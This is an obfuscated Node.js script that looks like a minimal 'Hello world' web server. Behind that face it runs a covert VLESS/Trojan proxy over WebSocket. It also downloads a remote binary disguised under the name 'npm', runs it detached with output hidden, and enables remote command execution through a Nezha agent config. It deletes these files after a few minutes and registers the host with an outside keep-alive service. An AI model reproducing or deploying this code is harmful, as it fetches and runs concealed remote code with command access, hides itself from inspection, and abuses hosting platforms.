const _0x1cd16c=_0x1da2;function _0x44e3(){const _0x32961c=['from','&path=%2F','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','http','writeHead','Answer','config.yaml','net','readFile','PORT','true','NAME','\x20-p\x20','Failed\x20to\x20resolve\x20','message','NEZHA_KEY','4230078mdaoSy','type','data','2083','buffer','npm\x20running\x20error:','8.8.4.4','base64','text/plain','finish','send','https://dns.google/resolve?name=','2055804UXMdCC','&fp=chrome&type=ws&host=','UUID','text/html','readUInt8','toString','false','setsid\x20nohup\x20./npm\x20-s\x20','443','slice','2087','2398035kQrNMa','utf8','NIbKdGI7ybwSzIxjPwPEzHi','test','430420aAgcVD','country','connect','createHash','AUTO_ACCESS','log','connection','asOrganization','split','index.html','url','trim','aarch64','find','NEZHA_PORT','SUB_PATH','https://amd64.ssss.nyc.mn/agent','Server\x20is\x20running\x20on\x20port\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','map','601475bHRAGg','huggingface','length','env','2096','reduce','Hello\x20world!','npm\x20download\x20successfully','crypto','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','https://oooo.serv00.net/add-url','close','Not\x20Found\x0a','sha224','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','pop','replace','listen','8673240tPWrrO','end','1234.abc.com','application/json','utf-8','unlink','post','then','e380546f-7781-4825-ad70-b7e4cc71063b','includes','1.1.1.1','client_secret:\x20','concat','8443','catch','/bin/bash','once','write','NEZHA_SERVER','https://amd64.ssss.nyc.mn/v1','trojan://','child_process','5KzyuyX','https://speed.cloudflare.com/meta','get','join','createServer','Status','https://','every','readUInt16BE','substr','1512068tryQNF','2053','pipe','npm','chmod\x20+x\x20npm','npm\x20is\x20running','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','vless://','WSPATH','error','Unknown','error:\x20','arm64','--tls','https://arm64.ssss.nyc.mn/agent'];_0x44e3=function(){return _0x32961c;};return _0x44e3();}(function(_0x994a44,_0x5a3b84){const _0x9b5a0c=_0x1da2,_0x11a644=_0x994a44();while(!![]){try{const _0x415bc7=-parseInt(_0x9b5a0c(0x194))/0x1+-parseInt(_0x9b5a0c(0x15a))/0x2+parseInt(_0x9b5a0c(0x190))/0x3+parseInt(_0x9b5a0c(0x185))/0x4+-parseInt(_0x9b5a0c(0x1d0))/0x5*(parseInt(_0x9b5a0c(0x179))/0x6)+-parseInt(_0x9b5a0c(0x1a8))/0x7+parseInt(_0x9b5a0c(0x1ba))/0x8;if(_0x415bc7===_0x5a3b84)break;else _0x11a644['push'](_0x11a644['shift']());}catch(_0x28e90e){_0x11a644['push'](_0x11a644['shift']());}}}(_0x44e3,0x668db));const os=require('os'),http=require(_0x1cd16c(0x16c)),fs=require('fs'),axios=require('axios'),net=require(_0x1cd16c(0x170)),path=require('path'),crypto=require(_0x1cd16c(0x1b0)),{Buffer}=require(_0x1cd16c(0x17d)),{exec,execSync}=require(_0x1cd16c(0x1cf)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1cd16c(0x1ab)][_0x1cd16c(0x187)]||_0x1cd16c(0x1c2),NEZHA_SERVER=process[_0x1cd16c(0x1ab)][_0x1cd16c(0x1cc)]||'',NEZHA_PORT=process[_0x1cd16c(0x1ab)][_0x1cd16c(0x1a2)]||'',NEZHA_KEY=process[_0x1cd16c(0x1ab)][_0x1cd16c(0x178)]||'',DOMAIN=process[_0x1cd16c(0x1ab)]['DOMAIN']||_0x1cd16c(0x1bc),AUTO_ACCESS=process[_0x1cd16c(0x1ab)][_0x1cd16c(0x198)]||!![],WSPATH=process['env'][_0x1cd16c(0x162)]||UUID[_0x1cd16c(0x18e)](0x0,0x8),SUB_PATH=process[_0x1cd16c(0x1ab)][_0x1cd16c(0x1a3)]||_0x1cd16c(0x192),NAME=process['env'][_0x1cd16c(0x174)]||_0x1cd16c(0x1a9),PORT=process[_0x1cd16c(0x1ab)][_0x1cd16c(0x172)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2c09ce=_0x1cd16c;try{const _0x12e257=await axios['get'](_0x2c09ce(0x1d1)),_0x390ea1=_0x12e257[_0x2c09ce(0x17b)];ISP=(_0x390ea1[_0x2c09ce(0x195)]+'-'+_0x390ea1[_0x2c09ce(0x19b)])[_0x2c09ce(0x1b8)](/ /g,'_');}catch(_0x1ceb0d){ISP=_0x2c09ce(0x164);}};GetISP();const httpServer=http[_0x1cd16c(0x1d4)]((_0x1b326a,_0x1f6848)=>{const _0x3c354b=_0x1cd16c;if(_0x1b326a[_0x3c354b(0x19e)]==='/'){const _0x51b212=path[_0x3c354b(0x1d3)](__dirname,_0x3c354b(0x19d));fs[_0x3c354b(0x171)](_0x51b212,_0x3c354b(0x191),(_0x16ff0b,_0x4195f6)=>{const _0xb0b11f=_0x3c354b;if(_0x16ff0b){_0x1f6848[_0xb0b11f(0x16d)](0xc8,{'Content-Type':'text/html'}),_0x1f6848[_0xb0b11f(0x1bb)](_0xb0b11f(0x1ae));return;}_0x1f6848[_0xb0b11f(0x16d)](0xc8,{'Content-Type':_0xb0b11f(0x188)}),_0x1f6848['end'](_0x4195f6);});return;}else{if(_0x1b326a['url']==='/'+SUB_PATH){const _0x2fd8b3=_0x3c354b(0x161)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x3c354b(0x186)+DOMAIN+_0x3c354b(0x16a)+WSPATH+'#'+NAME+'-'+ISP,_0x3eb481=_0x3c354b(0x1ce)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x3c354b(0x186)+DOMAIN+_0x3c354b(0x16a)+WSPATH+'#'+NAME+'-'+ISP,_0xfcbb79=_0x2fd8b3+'\x0a'+_0x3eb481,_0x5ace62=Buffer[_0x3c354b(0x169)](_0xfcbb79)['toString'](_0x3c354b(0x180));_0x1f6848['writeHead'](0xc8,{'Content-Type':_0x3c354b(0x181)}),_0x1f6848[_0x3c354b(0x1bb)](_0x5ace62+'\x0a');}else _0x1f6848['writeHead'](0x194,{'Content-Type':_0x3c354b(0x181)}),_0x1f6848[_0x3c354b(0x1bb)](_0x3c354b(0x1b4));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x1cd16c(0x1b8)](/-/g,''),DNS_SERVERS=[_0x1cd16c(0x17f),_0x1cd16c(0x1c4)];function resolveHost(_0x308005){return new Promise((_0x37e271,_0x347baa)=>{const _0x20be86=_0x1da2;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x20be86(0x193)](_0x308005)){_0x37e271(_0x308005);return;}let _0x29e5d3=0x0;function _0x5d3d5c(){const _0x8e6c07=_0x20be86;if(_0x29e5d3>=DNS_SERVERS[_0x8e6c07(0x1aa)]){_0x347baa(new Error(_0x8e6c07(0x176)+_0x308005+'\x20with\x20all\x20DNS\x20servers'));return;}const _0xeb0de=DNS_SERVERS[_0x29e5d3];_0x29e5d3++;const _0x13efb4=_0x8e6c07(0x184)+encodeURIComponent(_0x308005)+'&type=A';axios[_0x8e6c07(0x1d2)](_0x13efb4,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x8a686=>{const _0x4939d5=_0x8e6c07,_0x357b9d=_0x8a686[_0x4939d5(0x17b)];if(_0x357b9d[_0x4939d5(0x155)]===0x0&&_0x357b9d[_0x4939d5(0x16e)]&&_0x357b9d[_0x4939d5(0x16e)][_0x4939d5(0x1aa)]>0x0){const _0xe6cda5=_0x357b9d['Answer'][_0x4939d5(0x1a1)](_0x1ac494=>_0x1ac494[_0x4939d5(0x17a)]===0x1);if(_0xe6cda5){_0x37e271(_0xe6cda5[_0x4939d5(0x17b)]);return;}}_0x5d3d5c();})[_0x8e6c07(0x1c8)](_0x5591da=>{_0x5d3d5c();});}_0x5d3d5c();});}function handleVlessConnection(_0x448353,_0x5cec2c){const _0x413ba9=_0x1cd16c,[_0x36dfe0]=_0x5cec2c,_0xcb97e4=_0x5cec2c['slice'](0x1,0x11);if(!_0xcb97e4[_0x413ba9(0x157)]((_0x3f2804,_0x529a1c)=>_0x3f2804==parseInt(uuid[_0x413ba9(0x159)](_0x529a1c*0x2,0x2),0x10)))return![];let _0x1487dc=_0x5cec2c[_0x413ba9(0x18e)](0x11,0x12)[_0x413ba9(0x189)]()+0x13;const _0x51dbcc=_0x5cec2c[_0x413ba9(0x18e)](_0x1487dc,_0x1487dc+=0x2)[_0x413ba9(0x158)](0x0),_0x57b81a=_0x5cec2c[_0x413ba9(0x18e)](_0x1487dc,_0x1487dc+=0x1)[_0x413ba9(0x189)](),_0x340dea=_0x57b81a==0x1?_0x5cec2c[_0x413ba9(0x18e)](_0x1487dc,_0x1487dc+=0x4)[_0x413ba9(0x1d3)]('.'):_0x57b81a==0x2?new TextDecoder()['decode'](_0x5cec2c[_0x413ba9(0x18e)](_0x1487dc+0x1,_0x1487dc+=0x1+_0x5cec2c['slice'](_0x1487dc,_0x1487dc+0x1)[_0x413ba9(0x189)]())):_0x57b81a==0x3?_0x5cec2c[_0x413ba9(0x18e)](_0x1487dc,_0x1487dc+=0x10)['reduce']((_0x4bdad7,_0x259552,_0xa75a74,_0x32edea)=>_0xa75a74%0x2?_0x4bdad7[_0x413ba9(0x1c6)](_0x32edea[_0x413ba9(0x18e)](_0xa75a74-0x1,_0xa75a74+0x1)):_0x4bdad7,[])[_0x413ba9(0x1a7)](_0x2be392=>_0x2be392[_0x413ba9(0x158)](0x0)[_0x413ba9(0x18a)](0x10))[_0x413ba9(0x1d3)](':'):'';_0x448353[_0x413ba9(0x183)](new Uint8Array([_0x36dfe0,0x0]));const _0x5a953b=createWebSocketStream(_0x448353);return resolveHost(_0x340dea)[_0x413ba9(0x1c1)](_0x4e7340=>{const _0x3e658c=_0x413ba9;net[_0x3e658c(0x196)]({'host':_0x4e7340,'port':_0x51dbcc},function(){const _0x2ca8c8=_0x3e658c;this['write'](_0x5cec2c[_0x2ca8c8(0x18e)](_0x1487dc)),_0x5a953b['on']('error',()=>{})[_0x2ca8c8(0x15c)](this)['on']('error',()=>{})[_0x2ca8c8(0x15c)](_0x5a953b);})['on']('error',()=>{});})[_0x413ba9(0x1c8)](_0x1c7531=>{const _0x31c897=_0x413ba9;net[_0x31c897(0x196)]({'host':_0x340dea,'port':_0x51dbcc},function(){const _0x1010c0=_0x31c897;this['write'](_0x5cec2c[_0x1010c0(0x18e)](_0x1487dc)),_0x5a953b['on']('error',()=>{})[_0x1010c0(0x15c)](this)['on']('error',()=>{})[_0x1010c0(0x15c)](_0x5a953b);})['on'](_0x31c897(0x163),()=>{});}),!![];}function handleTrojanConnection(_0x4bc0ad,_0x23b582){const _0x2bc62a=_0x1cd16c;try{if(_0x23b582[_0x2bc62a(0x1aa)]<0x3a)return![];const _0x1fcec2=_0x23b582[_0x2bc62a(0x18e)](0x0,0x38)[_0x2bc62a(0x18a)](),_0x500742=[UUID];let _0x51ff02=null;for(const _0x41c9b5 of _0x500742){const _0x48a735=crypto[_0x2bc62a(0x197)](_0x2bc62a(0x1b5))['update'](_0x41c9b5)['digest']('hex');if(_0x48a735===_0x1fcec2){_0x51ff02=_0x41c9b5;break;}}if(!_0x51ff02)return![];let _0x3dda70=0x38;_0x23b582[_0x3dda70]===0xd&&_0x23b582[_0x3dda70+0x1]===0xa&&(_0x3dda70+=0x2);const _0x1da67a=_0x23b582[_0x3dda70];if(_0x1da67a!==0x1)return![];_0x3dda70+=0x1;const _0x16b158=_0x23b582[_0x3dda70];_0x3dda70+=0x1;let _0x31b33e,_0x259242;if(_0x16b158===0x1)_0x31b33e=_0x23b582[_0x2bc62a(0x18e)](_0x3dda70,_0x3dda70+0x4)[_0x2bc62a(0x1d3)]('.'),_0x3dda70+=0x4;else{if(_0x16b158===0x3){const _0x8d657d=_0x23b582[_0x3dda70];_0x3dda70+=0x1,_0x31b33e=_0x23b582[_0x2bc62a(0x18e)](_0x3dda70,_0x3dda70+_0x8d657d)[_0x2bc62a(0x18a)](),_0x3dda70+=_0x8d657d;}else{if(_0x16b158===0x4)_0x31b33e=_0x23b582[_0x2bc62a(0x18e)](_0x3dda70,_0x3dda70+0x10)[_0x2bc62a(0x1ad)]((_0x5440b1,_0x309a51,_0x496b11,_0x563148)=>_0x496b11%0x2?_0x5440b1['concat'](_0x563148['slice'](_0x496b11-0x1,_0x496b11+0x1)):_0x5440b1,[])[_0x2bc62a(0x1a7)](_0x3e7110=>_0x3e7110['readUInt16BE'](0x0)['toString'](0x10))[_0x2bc62a(0x1d3)](':'),_0x3dda70+=0x10;else return![];}}_0x259242=_0x23b582[_0x2bc62a(0x158)](_0x3dda70),_0x3dda70+=0x2;_0x3dda70<_0x23b582[_0x2bc62a(0x1aa)]&&_0x23b582[_0x3dda70]===0xd&&_0x23b582[_0x3dda70+0x1]===0xa&&(_0x3dda70+=0x2);const _0x3dcd66=createWebSocketStream(_0x4bc0ad);return resolveHost(_0x31b33e)[_0x2bc62a(0x1c1)](_0x3fb28a=>{const _0x4e3ca6=_0x2bc62a;net[_0x4e3ca6(0x196)]({'host':_0x3fb28a,'port':_0x259242},function(){const _0x4f6c0d=_0x4e3ca6;_0x3dda70<_0x23b582['length']&&this['write'](_0x23b582[_0x4f6c0d(0x18e)](_0x3dda70)),_0x3dcd66['on'](_0x4f6c0d(0x163),()=>{})['pipe'](this)['on'](_0x4f6c0d(0x163),()=>{})[_0x4f6c0d(0x15c)](_0x3dcd66);})['on'](_0x4e3ca6(0x163),()=>{});})[_0x2bc62a(0x1c8)](_0x3678b0=>{const _0x132abb=_0x2bc62a;net[_0x132abb(0x196)]({'host':_0x31b33e,'port':_0x259242},function(){const _0xc4ca60=_0x132abb;_0x3dda70<_0x23b582[_0xc4ca60(0x1aa)]&&this[_0xc4ca60(0x1cb)](_0x23b582['slice'](_0x3dda70)),_0x3dcd66['on'](_0xc4ca60(0x163),()=>{})[_0xc4ca60(0x15c)](this)['on'](_0xc4ca60(0x163),()=>{})[_0xc4ca60(0x15c)](_0x3dcd66);})['on'](_0x132abb(0x163),()=>{});}),!![];}catch(_0x55ae60){return![];}}wss['on'](_0x1cd16c(0x19a),(_0x468a2b,_0x132d21)=>{const _0x1a38b2=_0x1cd16c,_0x478efe=_0x132d21[_0x1a38b2(0x19e)]||'';_0x468a2b[_0x1a38b2(0x1ca)](_0x1a38b2(0x177),_0x5d1b23=>{const _0x48fc71=_0x1a38b2;if(_0x5d1b23[_0x48fc71(0x1aa)]>0x11&&_0x5d1b23[0x0]===0x0){const _0x2c6fc4=_0x5d1b23['slice'](0x1,0x11),_0x15b0c4=_0x2c6fc4[_0x48fc71(0x157)]((_0x308448,_0x243a9b)=>_0x308448==parseInt(uuid['substr'](_0x243a9b*0x2,0x2),0x10));if(_0x15b0c4){!handleVlessConnection(_0x468a2b,_0x5d1b23)&&_0x468a2b['close']();return;}}!handleTrojanConnection(_0x468a2b,_0x5d1b23)&&_0x468a2b[_0x48fc71(0x1b3)]();})['on'](_0x1a38b2(0x163),()=>{});});const getDownloadUrl=()=>{const _0x50116d=_0x1cd16c,_0x1f6d19=os['arch']();return _0x1f6d19==='arm'||_0x1f6d19===_0x50116d(0x166)||_0x1f6d19===_0x50116d(0x1a0)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x50116d(0x168):!NEZHA_PORT?_0x50116d(0x1cd):_0x50116d(0x1a4);},downloadFile=async()=>{const _0x884d75=_0x1cd16c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5916f1=getDownloadUrl(),_0x3c40a0=await axios({'method':'get','url':_0x5916f1,'responseType':'stream'}),_0x2c5d8e=fs['createWriteStream'](_0x884d75(0x15d));return _0x3c40a0[_0x884d75(0x17b)]['pipe'](_0x2c5d8e),new Promise((_0x9e809f,_0x32be5d)=>{const _0x1dda48=_0x884d75;_0x2c5d8e['on'](_0x1dda48(0x182),()=>{const _0x56e2c3=_0x1dda48;console['log'](_0x56e2c3(0x1af)),exec(_0x56e2c3(0x15e),_0x18b1bb=>{if(_0x18b1bb)_0x32be5d(_0x18b1bb);_0x9e809f();});}),_0x2c5d8e['on']('error',_0x32be5d);});}catch(_0xe87572){throw _0xe87572;}},runnz=async()=>{const _0x41e6a4=_0x1cd16c;try{const _0x16e34e=execSync(_0x41e6a4(0x1b6),{'encoding':_0x41e6a4(0x1be)});if(_0x16e34e[_0x41e6a4(0x19f)]()!==''){console[_0x41e6a4(0x199)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x54e7df){}await downloadFile();let _0x2f41b1='',_0x520021=[_0x41e6a4(0x18d),_0x41e6a4(0x1c7),_0x41e6a4(0x1ac),_0x41e6a4(0x18f),_0x41e6a4(0x17c),_0x41e6a4(0x15b)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5a48cf=_0x520021[_0x41e6a4(0x1c3)](NEZHA_PORT)?_0x41e6a4(0x167):'';_0x2f41b1=_0x41e6a4(0x18c)+NEZHA_SERVER+':'+NEZHA_PORT+_0x41e6a4(0x175)+NEZHA_KEY+'\x20'+_0x5a48cf+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1606a0=NEZHA_SERVER[_0x41e6a4(0x1c3)](':')?NEZHA_SERVER[_0x41e6a4(0x19c)](':')[_0x41e6a4(0x1b7)]():'',_0x4e24f7=_0x520021['includes'](_0x1606a0)?_0x41e6a4(0x173):_0x41e6a4(0x18b),_0x5b06ea=_0x41e6a4(0x1c5)+NEZHA_KEY+_0x41e6a4(0x1a6)+NEZHA_SERVER+_0x41e6a4(0x16b)+_0x4e24f7+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x41e6a4(0x16f),_0x5b06ea);}_0x2f41b1=_0x41e6a4(0x1b1);}else{console[_0x41e6a4(0x199)](_0x41e6a4(0x160));return;}}try{exec(_0x2f41b1,{'shell':_0x41e6a4(0x1c9)},_0x5a1c75=>{const _0x3c30e4=_0x41e6a4;if(_0x5a1c75)console[_0x3c30e4(0x163)](_0x3c30e4(0x17e),_0x5a1c75);else console[_0x3c30e4(0x199)](_0x3c30e4(0x15f));});}catch(_0x9a57b2){console[_0x41e6a4(0x163)](_0x41e6a4(0x165)+_0x9a57b2);}};function _0x1da2(_0x559314,_0x5535cc){_0x559314=_0x559314-0x155;const _0x44e3a4=_0x44e3();let _0x1da272=_0x44e3a4[_0x559314];return _0x1da272;}async function addAccessTask(){const _0x52efed=_0x1cd16c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2450fe=_0x52efed(0x156)+DOMAIN;try{const _0x222feb=await axios[_0x52efed(0x1c0)](_0x52efed(0x1b2),{'url':_0x2450fe},{'headers':{'Content-Type':_0x52efed(0x1bd)}});console[_0x52efed(0x199)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x315b89){}}const delFiles=()=>{const _0xe652ea=_0x1cd16c;fs[_0xe652ea(0x1bf)](_0xe652ea(0x15d),()=>{}),fs[_0xe652ea(0x1bf)](_0xe652ea(0x16f),()=>{});};httpServer[_0x1cd16c(0x1b9)](PORT,()=>{const _0x295f0f=_0x1cd16c;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x295f0f(0x1a5)+PORT);});
